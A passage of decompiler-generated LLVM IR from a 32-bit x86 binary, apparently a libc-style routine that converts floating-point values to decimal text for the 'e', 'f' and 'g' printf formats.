  store x86_fp80 %v3_8055dbb, x86_fp80* %st1.global-to-local, align 4
  br label %dec_label_pc_8055dd9

bb184:                                            ; preds = %bb183
  %not.v6_8055dc3 = fcmp une x86_fp80 %v3_8055dbb, %v1_8055dc9
  store x86_fp80 %v3_8055dbb, x86_fp80* %st1.global-to-local, align 4
  br i1 %not.v6_8055dc3, label %dec_label_pc_8055dd9, label %dec_label_pc_8055dc9

dec_label_pc_8055dc9:                             ; preds = %.thread55, %bb184
  store x86_fp80 %v3_8055dbb, x86_fp80* %st1.global-to-local, align 4
  %v5_8055dd3 = add i32 %stack_var_-220.0, %v0_8055ddf
  br label %dec_label_pc_8055ddb

dec_label_pc_8055dd9:                             ; preds = %dec_label_pc_8055d95, %.thread51, %bb184
  %v1_8055dd9 = phi x86_fp80 [ %v1_8055dc9, %.thread51 ], [ %v1_8055dc9, %bb184 ], [ %v3_8055d9a, %dec_label_pc_8055d95 ]
  %v0_8055d8e80 = phi x86_fp80 [ %v3_8055dbb, %.thread51 ], [ %v3_8055dbb, %bb184 ], [ %v4_8055da0, %dec_label_pc_8055d95 ]
  store x86_fp80 %v1_8055dd9, x86_fp80* %st0.global-to-local, align 4
  br label %dec_label_pc_8055ddb

dec_label_pc_8055ddb:                             ; preds = %dec_label_pc_8055dc9, %dec_label_pc_8055da8, %dec_label_pc_8055dd9
  %v2_8055d9181 = phi x86_fp80 [ %v1_8055dd9, %dec_label_pc_8055dd9 ], [ %v2_8055d91, %dec_label_pc_8055dc9 ], [ %v1_8055dc9, %dec_label_pc_8055da8 ]
  %v0_8055d8e79 = phi x86_fp80 [ %v0_8055d8e80, %dec_label_pc_8055dd9 ], [ %v3_8055dbb, %dec_label_pc_8055dc9 ], [ %v4_8055da0, %dec_label_pc_8055da8 ]
  %stack_var_-220.1 = phi i32 [ %stack_var_-220.0, %dec_label_pc_8055dd9 ], [ %v5_8055dd3, %dec_label_pc_8055dc9 ], [ %v5_8055db2, %dec_label_pc_8055da8 ]
  %v1_8055ddb = icmp eq i32 %v1_8055d90, 0
  br i1 %v1_8055ddb, label %.thread60, label %dec_label_pc_8055ddf

dec_label_pc_8055ddf:                             ; preds = %dec_label_pc_8055ddb
  %v2_8055ddf = sdiv i32 %v0_8055ddf, 2
  store i32 %v2_8055ddf, i32* %ecx.global-to-local, align 4
  br label %dec_label_pc_8055d8e

.thread60:                                        ; preds = %dec_label_pc_8055ddb
  store i32 0, i32* %edx.global-to-local, align 4
  store x86_fp80 0xK4019BEBC200000000000, x86_fp80* %st1.global-to-local, align 4
  br label %dec_label_pc_8055e03

dec_label_pc_8055e03:                             ; preds = %dec_label_pc_8055ce6, %.thread60
  %v0_8055ebd = phi i32 [ %stack_var_-220.1, %.thread60 ], [ -1, %dec_label_pc_8055ce6 ]
  %storemerge = phi x86_fp80 [ 0xK401CEE6B280000000000, %.thread60 ], [ 0xK3FFF8000000000000000, %dec_label_pc_8055ce6 ]
  store x86_fp80 %storemerge, x86_fp80* %st0.global-to-local, align 4
  %v2_8055e07 = ptrtoint i32* %stack_var_-70 to i32
  store i32 0, i32* @edi, align 4
  store x86_fp80 0xK401CEE6B280000000000, x86_fp80* %st1.global-to-local, align 4
  store i3 %v1_8055cde, i3* %fpu_stat_TOP.global-to-local, align 1
  %v6_8055e1a = and i32 %v2_8055e07, -65536
  %v1_8055e1f = udiv i16 %tmp146, 256
  %v2_8055e1f = zext i16 %v1_8055e1f to i32
  %v3_8055e1f = or i32 %v2_8055e1f, 12
  %v10_8055e1f = mul nuw nsw i32 %v3_8055e1f, 256
  %tmp194 = urem i16 %tmp146, 256
  %v4_8055e1a.masked = zext i16 %tmp194 to i32
  %v11_8055e1f = or i32 %v10_8055e1f, %v4_8055e1a.masked
  %v12_8055e1f = or i32 %v11_8055e1f, %v6_8055e1a
  store i32 %v12_8055e1f, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8055e27

dec_label_pc_8055e27:                             ; preds = %dec_label_pc_8055e79.dec_label_pc_8055e27_crit_edge, %dec_label_pc_8055e03
  %v2_8055e4c = phi x86_fp80 [ %storemerge, %dec_label_pc_8055e03 ], [ %v2_8055e4c.pre, %dec_label_pc_8055e79.dec_label_pc_8055e27_crit_edge ]
  %v1_8055e27 = phi i3 [ %v1_8055cde, %dec_label_pc_8055e03 ], [ %v1_8055e27.pre, %dec_label_pc_8055e79.dec_label_pc_8055e27_crit_edge ]
  %v3_8055e4e = phi x86_fp80 [ 0xK401CEE6B280000000000, %dec_label_pc_8055e03 ], [ %v0_8055e27.pre, %dec_label_pc_8055e79.dec_label_pc_8055e27_crit_edge ]
  %stack_var_-212.0 = phi i32 [ %v2_8055e07, %dec_label_pc_8055e03 ], [ %v4_8055e47, %dec_label_pc_8055e79.dec_label_pc_8055e27_crit_edge ]
  store i32 0, i32* %edx.global-to-local, align 4
  store i32 0, i32* %esi.global-to-local, align 4
  %tmp195 = fptosi x86_fp80 %v3_8055e4e to i32
  store i32 %tmp195, i32* %eax.global-to-local, align 4
  store i32 %tmp195, i32* %ecx.global-to-local, align 4
  %v5_8055e41 = sitofp i32 %tmp195 to x86_fp80
  %v4_8055e47 = add i32 %stack_var_-212.0, 9
  %v4_8055e4c = fsub x86_fp80 %v2_8055e4c, %v5_8055e41
  store i3 %v1_8055e27, i3* %fpu_stat_TOP.global-to-local, align 1
  %v4_8055e4e = fmul x86_fp80 %v3_8055e4e, %v4_8055e4c
  store x86_fp80 %v4_8055e4e, x86_fp80* %st0.global-to-local, align 4
  br label %dec_label_pc_8055e50

dec_label_pc_8055e50:                             ; preds = %dec_label_pc_8055e50.dec_label_pc_8055e50_crit_edge, %dec_label_pc_8055e27
  %v0_8055e64 = phi i32 [ %v0_8055e64.pre, %dec_label_pc_8055e50.dec_label_pc_8055e50_crit_edge ], [ %tmp195, %dec_label_pc_8055e27 ]
  %v0_8055e54 = phi i32 [ %v0_8055e54.pre, %dec_label_pc_8055e50.dec_label_pc_8055e50_crit_edge ], [ 0, %dec_label_pc_8055e27 ]
  %v1_8055e54 = add i32 %v0_8055e54, 1
  store i32 %v1_8055e54, i32* %esi.global-to-local, align 4
  store i32 10, i32* %ebx.global-to-local, align 4
  %v2_8055e5e = sub i32 %v4_8055e47, %v1_8055e54
  %div = udiv i32 %v0_8055e64, 10
  %tmp185 = urem i32 %v0_8055e64, 10
  store i32 %div, i32* %ecx.global-to-local, align 4
  %v3_8055e6a = and i32 %div, 536870656
  store i32 %v2_8055e5e, i32* %edx.global-to-local, align 4
  %v1_8055e70 = trunc i32 %tmp185 to i8
  %v2_8055e70 = or i8 %v1_8055e70, 48
  %v12_8055e70 = zext i8 %v2_8055e70 to i32
  %v15_8055e70 = or i32 %v12_8055e70, %v3_8055e6a
  store i32 %v15_8055e70, i32* %eax.global-to-local, align 4
  %v3_8055e75 = inttoptr i32 %v2_8055e5e to i8*
  store i8 %v2_8055e70, i8* %v3_8055e75, align 1
  %v7_8055e77 = icmp sgt i32 %v1_8055e54, 8
  br i1 %v7_8055e77, label %dec_label_pc_8055e79, label %dec_label_pc_8055e50.dec_label_pc_8055e50_crit_edge

dec_label_pc_8055e50.dec_label_pc_8055e50_crit_edge: ; preds = %dec_label_pc_8055e50
  %v0_8055e54.pre = load i32, i32* %esi.global-to-local, align 4
  %v0_8055e64.pre = load i32, i32* %ecx.global-to-local, align 4
  br label %dec_label_pc_8055e50

dec_label_pc_8055e79:                             ; preds = %dec_label_pc_8055e50
  %v0_8055e79 = load i32, i32* @edi, align 4
  %v1_8055e79 = add i32 %v0_8055e79, 1
  store i32 %v1_8055e79, i32* @edi, align 4
  %v7_8055e7d = icmp sgt i32 %v1_8055e79, 2
  br i1 %v7_8055e7d, label %dec_label_pc_8055e7f, label %dec_label_pc_8055e79.dec_label_pc_8055e27_crit_edge

dec_label_pc_8055e79.dec_label_pc_8055e27_crit_edge: ; preds = %dec_label_pc_8055e79
  %v0_8055e27.pre = load x86_fp80, x86_fp80* %st1.global-to-local, align 4
  %v1_8055e27.pre = load i3, i3* %fpu_stat_TOP.global-to-local, align 1
  %v2_8055e4c.pre = load x86_fp80, x86_fp80* %st0.global-to-local, align 4
  br label %dec_label_pc_8055e27

dec_label_pc_8055e7f:                             ; preds = %dec_label_pc_8055e79
  %v0_8055e7f = load i3, i3* %fpu_stat_TOP.global-to-local, align 1
  %v1_8055e7f = load x86_fp80, x86_fp80* %st1.global-to-local, align 4
  store x86_fp80 %v1_8055e7f, x86_fp80* %st0.global-to-local, align 4
  %v2_8055e81 = add i3 %v0_8055e7f, 2
  store i3 %v2_8055e81, i3* %fpu_stat_TOP.global-to-local, align 1
  %v4_8055e83 = add i8 %stack_var_-207.0, -96
  %v6_8055e83 = sub i8 95, %stack_var_-207.0
  %v7_8055e83 = and i8 %v6_8055e83, %stack_var_-207.0
  %v8_8055e83 = icmp slt i8 %v7_8055e83, 0
  %v9_8055e83 = icmp eq i8 %v4_8055e83, 0
  %v10_8055e83 = icmp slt i8 %v4_8055e83, 0
  %v3_8055e88 = icmp eq i1 %v10_8055e83, %v8_8055e83
  %v4_8055e88 = icmp eq i1 %v9_8055e83, false
  %v5_8055e88 = and i1 %v4_8055e88, %v3_8055e88
  br i1 %v5_8055e88, label %dec_label_pc_8055e97, label %dec_label_pc_8055e8a

dec_label_pc_8055e8a:                             ; preds = %dec_label_pc_8055e7f
  %v4_8055e8a = add i8 %stack_var_-207.0, 32
  br label %dec_label_pc_8055e97

dec_label_pc_8055e97:                             ; preds = %dec_label_pc_8055e7f, %dec_label_pc_8055e8a
  %stack_var_-207.1 = phi i8 [ %stack_var_-207.0, %dec_label_pc_8055e7f ], [ %v4_8055e8a, %dec_label_pc_8055e8a ]
  %stack_var_-42.0 = phi i32 [ 101, %dec_label_pc_8055e7f ], [ 69, %dec_label_pc_8055e8a ]
  %v12_8055e97 = icmp eq i8 %stack_var_-207.1, 103
  %v1_8055e9c = icmp eq i1 %v12_8055e97, false
  br i1 %v1_8055e9c, label %dec_label_pc_8055ea5, label %dec_label_pc_8055e9e

dec_label_pc_8055e9e:                             ; preds = %dec_label_pc_8055e97
  %v0_8055e9e = load i32, i32* %ebp.global-to-local, align 4
  %tmp186 = icmp slt i32 %v0_8055e9e, 1
  br i1 %tmp186, label %dec_label_pc_8055eac, label %dec_label_pc_8055ea2

dec_label_pc_8055ea2:                             ; preds = %dec_label_pc_8055e9e
  %v1_8055ea2 = add i32 %v0_8055e9e, -1
  store i32 %v1_8055ea2, i32* %ebp.global-to-local, align 4
  br label %dec_label_pc_8055eac

dec_label_pc_8055ea5:                             ; preds = %dec_label_pc_8055e97
  %v12_8055ea5 = icmp eq i8 %stack_var_-207.1, 102
  br i1 %v12_8055ea5, label %dec_label_pc_8055eb0, label %dec_label_pc_8055ea5.dec_label_pc_8055eac_crit_edge

dec_label_pc_8055ea5.dec_label_pc_8055eac_crit_edge: ; preds = %dec_label_pc_8055ea5
  %v0_8055eac.pre = load i32, i32* %ebp.global-to-local, align 4
  br label %dec_label_pc_8055eac

dec_label_pc_8055eac:                             ; preds = %dec_label_pc_8055ea5.dec_label_pc_8055eac_crit_edge, %dec_label_pc_8055e9e, %dec_label_pc_8055ea2
  %v0_8055eac = phi i32 [ %v0_8055eac.pre, %dec_label_pc_8055ea5.dec_label_pc_8055eac_crit_edge ], [ %v0_8055e9e, %dec_label_pc_8055e9e ], [ %v1_8055ea2, %dec_label_pc_8055ea2 ]
  store i32 %v0_8055eac, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_8055edd

dec_label_pc_8055eb0:                             ; preds = %dec_label_pc_8055ea5
  store i32 %v0_8055ebd, i32* %eax.global-to-local, align 4
  %v0_8055eb4 = load i32, i32* %ebp.global-to-local, align 4
  %v2_8055eb4 = add i32 %v0_8055eb4, %v0_8055ebd
  store i32 %v2_8055eb4, i32* %ebx.global-to-local, align 4
  %v5_8055ebb = icmp slt i32 %v2_8055eb4, -1
  br i1 %v5_8055ebb, label %dec_label_pc_8055ebd, label %dec_label_pc_8055edd

dec_label_pc_8055ebd:                             ; preds = %dec_label_pc_8055eb0
  store i32 -1, i32* %ebx.global-to-local, align 4
  %v2_8055ec5 = ptrtoint i32* %stack_var_-72 to i32
  store i32 %v2_8055ec5, i32* %eax.global-to-local, align 4
  %v4_8055ecd = bitcast i32* %stack_var_-72 to i8*
  %v5_8055ecd = call i32 @__GI_memset(i8* %v4_8055ecd, i32 48, i32 21)
  store i32 %v5_8055ecd, i32* %eax.global-to-local, align 4
  %v0_8055edd.pr.pre = load i32, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_8055edd

dec_label_pc_8055edd:                             ; preds = %dec_label_pc_8055eb0, %dec_label_pc_8055ebd, %dec_label_pc_8055eac
  %v1_8055efd = phi i32 [ %v0_8055eac, %dec_label_pc_8055eac ], [ %v2_8055eb4, %dec_label_pc_8055eb0 ], [ %v0_8055edd.pr.pre, %dec_label_pc_8055ebd ]
  %stack_var_-220.3 = phi i32 [ %v0_8055ebd, %dec_label_pc_8055eac ], [ %v0_8055ebd, %dec_label_pc_8055eb0 ], [ -1, %dec_label_pc_8055ebd ]
  store i32 0, i32* %stack_var_-72, align 4
  store i32 48, i32* %stack_var_-71, align 4
  %v7_8055ef0 = icmp sgt i32 %v1_8055efd, 20
  br i1 %v7_8055ef0, label %dec_label_pc_8055ef2, label %dec_label_pc_8055efd

dec_label_pc_8055ef2:                             ; preds = %dec_label_pc_8055edd
  %v2_8055ef2 = ptrtoint i32* %stack_var_-49 to i32
  store i32 %v2_8055ef2, i32* %ecx.global-to-local, align 4
  br label %dec_label_pc_8055f11.preheader

dec_label_pc_8055efd:                             ; preds = %dec_label_pc_8055edd
  %v0_8055efd = load i32, i32* @esp, align 4
  %v2_8055efd = add i32 %v1_8055efd, 165
  %v3_8055efd = add i32 %v2_8055efd, %v0_8055efd
  store i32 %v3_8055efd, i32* %eax.global-to-local, align 4
  %v1_8055f04 = add i32 %v3_8055efd, 2
  %v2_8055f04 = inttoptr i32 %v1_8055f04 to i8*
  %v3_8055f04 = load i8, i8* %v2_8055f04, align 1
  %v4_8055f04 = add i8 %v3_8055f04, -53
  %v9_8055f04 = sub i8 52, %v3_8055f04
  %v10_8055f04 = and i8 %v9_8055f04, %v3_8055f04
  %v11_8055f04 = icmp slt i8 %v10_8055f04, 0
  %v13_8055f04 = icmp slt i8 %v4_8055f04, 0
  store i32 %v1_8055f04, i32* %ecx.global-to-local, align 4
  %v2_8055f0b = icmp eq i1 %v13_8055f04, %v11_8055f04
  %v3_8055f0b = zext i1 %v2_8055f0b to i32
  br label %dec_label_pc_8055f11.preheader

dec_label_pc_8055f11.preheader:                   ; preds = %dec_label_pc_8055efd, %dec_label_pc_8055ef2
  %v0_8055f11102 = phi i32 [ %v1_8055f04, %dec_label_pc_8055efd ], [ %v2_8055ef2, %dec_label_pc_8055ef2 ]
  %storemerge71 = phi i32 [ %v3_8055f0b, %dec_label_pc_8055efd ], [ 0, %dec_label_pc_8055ef2 ]
  store i32 %storemerge71, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8055f11

dec_label_pc_8055f11:                             ; preds = %dec_label_pc_8055f11.backedge, %dec_label_pc_8055f11.preheader
  %v3_8055f12 = phi i32 [ %v3_8055f12.pre, %dec_label_pc_8055f11.backedge ], [ %storemerge71, %dec_label_pc_8055f11.preheader ]
  %v0_8055f11 = phi i32 [ %v0_8055f14, %dec_label_pc_8055f11.backedge ], [ %v0_8055f11102, %dec_label_pc_8055f11.preheader ]
  %v1_8055f11 = add i32 %v0_8055f11, -1
  store i32 %v1_8055f11, i32* %ecx.global-to-local, align 4
  %v1_8055f12 = inttoptr i32 %v1_8055f11 to i8*
  %v2_8055f12 = load i8, i8* %v1_8055f12, align 1
  %v4_8055f12 = trunc i32 %v3_8055f12 to i8
  %v5_8055f12 = add i8 %v2_8055f12, %v4_8055f12
  store i8 %v5_8055f12, i8* %v1_8055f12, align 1
  %v0_8055f14 = load i32, i32* %ecx.global-to-local, align 4
  %v1_8055f14 = inttoptr i32 %v0_8055f14 to i8*
  %v2_8055f14 = load i8, i8* %v1_8055f14, align 1
  %v3_8055f14 = zext i8 %v2_8055f14 to i32
  %v4_8055f14 = load i32, i32* %edx.global-to-local, align 4
  %v5_8055f14 = and i32 %v4_8055f14, -256
  %v6_8055f14 = or i32 %v5_8055f14, %v3_8055f14
  store i32 %v6_8055f14, i32* %edx.global-to-local, align 4
  %v7_8055f16 = icmp eq i8 %v2_8055f14, 48
  br i1 %v7_8055f16, label %dec_label_pc_8055f11.backedge, label %dec_label_pc_8055f1b

dec_label_pc_8055f11.backedge:                    ; preds = %dec_label_pc_8055f11, %dec_label_pc_8055f1b
  %v3_8055f12.pre = load i32, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8055f11

dec_label_pc_8055f1b:                             ; preds = %dec_label_pc_8055f11
  %v2_8055f1b = add i8 %v2_8055f14, -57
  %v7_8055f1b = sub i8 56, %v2_8055f14
  %v8_8055f1b = and i8 %v7_8055f1b, %v2_8055f14
  %v9_8055f1b = icmp slt i8 %v8_8055f1b, 0
  %v10_8055f1b = icmp eq i8 %v2_8055f1b, 0
  %v11_8055f1b = icmp slt i8 %v2_8055f1b, 0
  %v3_8055f1e = icmp eq i1 %v11_8055f1b, %v9_8055f1b
  %v4_8055f1e = icmp eq i1 %v10_8055f1b, false
  %v5_8055f1e = and i1 %v4_8055f1e, %v3_8055f1e
  br i1 %v5_8055f1e, label %dec_label_pc_8055f11.backedge, label %dec_label_pc_8055f20

dec_label_pc_8055f20:                             ; preds = %dec_label_pc_8055f1b
  %v2_8055f20 = ptrtoint i32* %stack_var_-71 to i32
  store i32 %v2_8055f20, i32* %eax.global-to-local, align 4
  %tmp196 = icmp ugt i32 %v0_8055f14, %v2_8055f20
  store i32 %stack_var_-220.3, i32* %esi.global-to-local, align 4
  br i1 %tmp196, label %dec_label_pc_8055f2b, label %dec_label_pc_8055f38

dec_label_pc_8055f2b:                             ; preds = %dec_label_pc_8055f20
  store i32 %v2_8055e07, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_8055f41

dec_label_pc_8055f38:                             ; preds = %dec_label_pc_8055f20
  store i32 %v2_8055f20, i32* %edx.global-to-local, align 4
  store i32 %v2_8055f20, i32* %ecx.global-to-local, align 4
  %v1_8055f40 = add i32 %stack_var_-220.3, 1
  store i32 %v1_8055f40, i32* %esi.global-to-local, align 4
  br label %dec_label_pc_8055f41

dec_label_pc_8055f41:                             ; preds = %dec_label_pc_8055f2b, %dec_label_pc_8055f38
  %v0_8055f41 = phi i32 [ %v0_8055f14, %dec_label_pc_8055f2b ], [ %v2_8055f20, %dec_label_pc_8055f38 ]
  %v1_8055f41 = add i32 %v0_8055f41, 1
  store i32 %v1_8055f41, i32* %eax.global-to-local, align 4
  %v2_8055f48 = inttoptr i32 %v1_8055f41 to i8*
  store i8 0, i8* %v2_8055f48, align 1
  br i1 %v1_8055e9c, label %dec_label_pc_8055f6e, label %dec_label_pc_8055f53

dec_label_pc_8055f53:                             ; preds = %dec_label_pc_8055f41
  %v0_8055f53 = load i32, i32* %esi.global-to-local, align 4
  %v5_8055f56 = icmp slt i32 %v0_8055f53, -4
  br i1 %v5_8055f56, label %dec_label_pc_8055f7b, label %dec_label_pc_8055f58

dec_label_pc_8055f58:                             ; preds = %dec_label_pc_8055f53
  %v1_8055f58 = load i32, i32* %ebx.global-to-local, align 4
  %v7_8055f5a = icmp slt i32 %v1_8055f58, %v0_8055f53
  br i1 %v7_8055f5a, label %dec_label_pc_8055f7b, label %dec_label_pc_8055f63

dec_label_pc_8055f63:                             ; preds = %dec_label_pc_8055f58
  %v2_8055f65 = sub i32 %v1_8055f58, %v0_8055f53
  store i32 %v2_8055f65, i32* %ebp.global-to-local, align 4
  br label %dec_label_pc_8055f7f

dec_label_pc_8055f6e:                             ; preds = %dec_label_pc_8055f41
  %v4_8055f6e = zext i8 %stack_var_-207.1 to i32
  %v5_8055f6e = load i32, i32* %ebx.global-to-local, align 4
  %v6_8055f6e = and i32 %v5_8055f6e, -256
  %v7_8055f6e = or i32 %v6_8055f6e, %v4_8055f6e
  store i32 %v7_8055f6e, i32* %ebx.global-to-local, align 4
  %v10_8055f72 = icmp eq i8 %stack_var_-207.1, 102
  br i1 %v10_8055f72, label %dec_label_pc_8055f6e.dec_label_pc_8055f7f_crit_edge, label %dec_label_pc_8055f7b

dec_label_pc_8055f6e.dec_label_pc_8055f7f_crit_edge: ; preds = %dec_label_pc_8055f6e
  %v0_8055f7f.pre = load i32, i32* %esi.global-to-local, align 4
  br label %dec_label_pc_8055f7f

dec_label_pc_8055f7b:                             ; preds = %dec_label_pc_8055f53, %dec_label_pc_8055f58, %dec_label_pc_8055f6e
  %stack_var_-197.0 = phi i8 [ %stack_var_-207.1, %dec_label_pc_8055f6e ], [ 103, %dec_label_pc_8055f58 ], [ 103, %dec_label_pc_8055f53 ]
  store i32 0, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_8055f89

dec_label_pc_8055f7f:                             ; preds = %dec_label_pc_8055f6e.dec_label_pc_8055f7f_crit_edge, %dec_label_pc_8055f63
  %v0_8055f81 = phi i32 [ %v0_8055f7f.pre, %dec_label_pc_8055f6e.dec_label_pc_8055f7f_crit_edge ], [ %v0_8055f53, %dec_label_pc_8055f63 ]
  %stack_var_-197.1 = phi i8 [ %stack_var_-207.1, %dec_label_pc_8055f6e.dec_label_pc_8055f7f_crit_edge ], [ 102, %dec_label_pc_8055f63 ]
  %v2_8055f7f = icmp slt i32 %v0_8055f81, 0
  store i32 %v0_8055f81, i32* %ebx.global-to-local, align 4
  %v1_8055f83 = icmp eq i1 %v2_8055f7f, false
  br i1 %v1_8055f83, label %dec_label_pc_8055f89, label %dec_label_pc_8055f85

dec_label_pc_8055f85:                             ; preds = %dec_label_pc_8055f7f
  %v0_8055f85 = load i32, i32* %edx.global-to-local, align 4
  %v1_8055f85 = add i32 %v0_8055f85, -1
  store i32 %v1_8055f85, i32* %edx.global-to-local, align 4
  %v1_8055f86 = inttoptr i32 %v1_8055f85 to i8*
  store i8 48, i8* %v1_8055f86, align 1
  %v0_8055fbe.pre = load i32, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_8055f89

dec_label_pc_8055f89:                             ; preds = %dec_label_pc_8055f7f, %dec_label_pc_8055f7b, %dec_label_pc_8055f85
  %v1_8056019 = phi i32 [ %v0_8055f81, %dec_label_pc_8055f7f ], [ %v0_8055fbe.pre, %dec_label_pc_8055f85 ], [ 0, %dec_label_pc_8055f7b ]
  %stack_var_-197.2 = phi i8 [ %stack_var_-197.1, %dec_label_pc_8055f7f ], [ %stack_var_-197.1, %dec_label_pc_8055f85 ], [ %stack_var_-197.0, %dec_label_pc_8055f7b ]
  %v2_8055f89 = ptrtoint i32* %stack_var_-22 to i32
  store i32 %v2_8055f89, i32* %eax.global-to-local, align 4
  %v0_8055f98 = load i32, i32* %edx.global-to-local, align 4
  %v1_8055f98 = add i32 %v0_8055f98, 1
  store i32 %v1_8055f98, i32* %edi.global-to-local, align 4
  store i32 1, i32* %stack_var_-152, align 4
  %v1_8055fa7 = inttoptr i32 %v0_8055f98 to i8*
  %v2_8055fa7 = load i8, i8* %v1_8055fa7, align 1
  %v3_8055fa7 = zext i8 %v2_8055fa7 to i32
  %v5_8055fa7 = and i32 %v2_8055f89, -256
  %v6_8055fa7 = or i32 %v3_8055fa7, %v5_8055fa7
  store i32 %v6_8055fa7, i32* %eax.global-to-local, align 4
  store i32 %v6_8055fa7, i32* %stack_var_-22, align 4
  %v2_8055fbc = sub i32 %v1_8055f41, %v1_8055f98
  store i32 %v2_8055fbc, i32* %edx.global-to-local, align 4
  %v1_8055fbe = icmp eq i32 %v1_8056019, 0
  %v2_8055fbe = icmp slt i32 %v1_8056019, 0
  br i1 %v2_8055fbe, label %dec_label_pc_805600d, label %dec_label_pc_8055fc2

dec_label_pc_8055fc2:                             ; preds = %dec_label_pc_8055f89
  %v2_8055fc2 = sub i32 %v1_8056019, %v2_8055fbc
  %v8_8055fc2 = xor i32 %v2_8055fbc, %v1_8056019
  %v9_8055fc2 = xor i32 %v2_8055fc2, %v1_8056019
  %v10_8055fc2 = and i32 %v9_8055fc2, %v8_8055fc2
  %v11_8055fc2 = icmp slt i32 %v10_8055fc2, 0
  %v13_8055fc2 = icmp slt i32 %v2_8055fc2, 0
  store i32 112, i32* %stack_var_-144, align 4
  %v2_8055fd0 = icmp eq i1 %v13_8055fc2, %v11_8055fc2
  br i1 %v2_8055fd0, label %dec_label_pc_8055fd2, label %dec_label_pc_8056006

dec_label_pc_8055fd2:                             ; preds = %dec_label_pc_8055fc2
  store i32 %v2_8055fc2, i32* %eax.global-to-local, align 4
  %tmp187 = icmp slt i32 %v2_8055fc2, 1
  %tmp188 = icmp eq i1 %tmp187, false
  br i1 %tmp188, label %dec_label_pc_8055fe7, label %dec_label_pc_8056002

dec_label_pc_8055fe7:                             ; preds = %dec_label_pc_8055fd2
  store i32 176, i32* %stack_var_-132, align 4
  br label %dec_label_pc_8056002

dec_label_pc_8056002:                             ; preds = %dec_label_pc_8055fd2, %dec_label_pc_8055fe7
  %storemerge28.in = phi i32* [ %stack_var_-120, %dec_label_pc_8055fe7 ], [ %stack_var_-132, %dec_label_pc_8055fd2 ]
  store i32 -1, i32* %ebx.global-to-local, align 4
  %storemerge28 = ptrtoint i32* %storemerge28.in to i32
  store i32 %storemerge28, i32* @ecx, align 4
  store i32 0, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_8056022

dec_label_pc_8056006:                             ; preds = %dec_label_pc_8055fc2
  %v4_8056008 = icmp eq i1 %v1_8055fbe, false
  br i1 %v4_8056008, label %dec_label_pc_8056013, label %dec_label_pc_805600a

dec_label_pc_805600a:                             ; preds = %dec_label_pc_8056006
  store i32 -1, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_805600d

dec_label_pc_805600d:                             ; preds = %dec_label_pc_8055f89, %dec_label_pc_805600a
  %v0_8056055112 = phi i32 [ %v1_8056019, %dec_label_pc_8055f89 ], [ -1, %dec_label_pc_805600a ]
  %v2_805600d = ptrtoint i32* %stack_var_-144 to i32
  store i32 %v2_805600d, i32* @ecx, align 4
  br label %dec_label_pc_8056022

dec_label_pc_8056013:                             ; preds = %dec_label_pc_8056006
  %v2_8056017 = add i32 %v1_8055f98, %v1_8056019
  store i32 %v2_8056017, i32* %edi.global-to-local, align 4
  %v2_8056019 = sub i32 %v2_8055fbc, %v1_8056019
  store i32 %v2_8056019, i32* %edx.global-to-local, align 4
  %v2_805601b = ptrtoint i32* %stack_var_-132 to i32
  store i32 %v2_805601b, i32* @ecx, align 4
  store i32 -1, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_8056022

dec_label_pc_8056022:                             ; preds = %dec_label_pc_805600d, %dec_label_pc_8056002, %dec_label_pc_8056013
  %v0_8056055111 = phi i32 [ %v0_8056055112, %dec_label_pc_805600d ], [ -1, %dec_label_pc_8056002 ], [ -1, %dec_label_pc_8056013 ]
  %v0_805603e = phi i32 [ %v2_805600d, %dec_label_pc_805600d ], [ %storemerge28, %dec_label_pc_8056002 ], [ %v2_805601b, %dec_label_pc_8056013 ]
  %v0_805602f = phi i32 [ %v2_8055fbc, %dec_label_pc_805600d ], [ 0, %dec_label_pc_8056002 ], [ %v2_8056019, %dec_label_pc_8056013 ]
  store i32 %tmp156, i32* %eax.global-to-local, align 4
  %v2_8056029 = inttoptr i32 %v1_8055c9f to i8*
  %v3_8056029 = load i8, i8* %v2_8056029, align 1
  %v4_8056029 = and i8 %v3_8056029, 16
  %v5_8056029 = icmp eq i8 %v4_8056029, 0
  %v1_805602d = icmp eq i1 %v5_8056029, false
  br i1 %v1_805602d, label %dec_label_pc_805603e, label %dec_label_pc_805602f

dec_label_pc_805602f:                             ; preds = %dec_label_pc_8056022
  %v1_805602f = icmp eq i32 %v0_805602f, 0
  %v1_8056031 = icmp eq i1 %v1_805602f, false
  br i1 %v1_8056031, label %dec_label_pc_805603e, label %dec_label_pc_8056033

dec_label_pc_8056033:                             ; preds = %dec_label_pc_805602f
  br i1 %v12_8055e97, label %dec_label_pc_8056055, label %dec_label_pc_805603a

dec_label_pc_805603a:                             ; preds = %dec_label_pc_8056033
  %v0_805603a = load i32, i32* %ebp.global-to-local, align 4
  %tmp189 = icmp slt i32 %v0_805603a, 1
  br i1 %tmp189, label %dec_label_pc_8056055, label %dec_label_pc_805603e

dec_label_pc_805603e:                             ; preds = %dec_label_pc_805603a, %dec_label_pc_805602f, %dec_label_pc_8056022
  %v1_805603e = inttoptr i32 %v0_805603e to i32*
  store i32 112, i32* %v1_805603e, align 4
  %v0_8056044 = load i32, i32* @ecx, align 4
  %v1_8056044 = add i32 %v0_8056044, 4
  %v2_8056044 = inttoptr i32 %v1_8056044 to i32*
  store i32 1, i32* %v2_8056044, align 4
  %v0_805604b = load i32, i32* @ecx, align 4
  %v1_805604b = add i32 %v0_805604b, 8
  %v2_805604b = inttoptr i32 %v1_805604b to i32*
  store i32 ptrtoint (i32* @global_var_805b420.557 to i32), i32* %v2_805604b, align 4
  %v0_8056052 = load i32, i32* @ecx, align 4
  %v1_8056052 = add i32 %v0_8056052, 12
  store i32 %v1_8056052, i32* @ecx, align 4
  %v0_8056055.pre = load i32, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_8056055

dec_label_pc_8056055:                             ; preds = %dec_label_pc_805603a, %dec_label_pc_8056033, %dec_label_pc_805603e
  %v0_805605c = phi i32 [ %v0_805603e, %dec_label_pc_805603a ], [ %v0_805603e, %dec_label_pc_8056033 ], [ %v1_8056052, %dec_label_pc_805603e ]
